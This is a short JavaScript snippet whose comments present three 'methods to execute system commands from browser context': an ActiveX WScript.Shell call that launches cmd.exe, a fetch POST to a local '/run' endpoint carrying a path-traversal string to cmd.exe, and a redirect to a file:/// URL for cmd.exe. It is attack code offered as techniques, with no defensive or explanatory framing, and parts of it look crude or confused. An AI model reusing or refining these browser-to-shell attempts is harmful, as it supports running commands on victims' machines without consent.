// Various methods to execute system commands from browser context
// Method 1: ActiveX (Internet Explorer only)
try {
    new ActiveXObject('WScript.Shell').Run('cmd /c ../../../../../../../../Windows/System32/cmd.exe');
} catch(e) {}

// Method 2: Fetch + potential exploitation (theoretical)
fetch('http://localhost:3000/run', {
    method: 'POST',
    body: JSON.stringify({command: '../../../../../../../../Windows/System32/cmd.exe'})
});

// Method 3: Protocol handler (would require specific vulnerabilities)
window.location = 'file:///C:/Windows/System32/cmd.exe';
